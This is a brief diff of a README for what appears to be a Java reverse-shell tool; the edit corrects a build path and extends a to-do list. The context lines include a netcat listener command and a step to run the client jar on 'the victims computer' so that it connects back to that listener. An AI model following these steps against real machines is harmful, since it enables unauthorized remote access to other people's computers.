@@ -18,7 +18,7 @@ nc -lvnp 4444
 ./gradlew build
 ```
 
-3) Grab the `.jar` from `./build/libs` and execute it on the victims computer using:
+3) Grab the `.jar` from `./src/client/build/libs` and execute it on the victims computer using:
 
 ```bash
 java -jar <filename.jar> 127.0.0.1 4444
@@ -38,6 +38,7 @@ Things that need to be done:
 
 1) Server implementation
 2) ...
+3) ...
    ...
 
 ![README ending picture](imgs/readme-ending-picture.jpg)
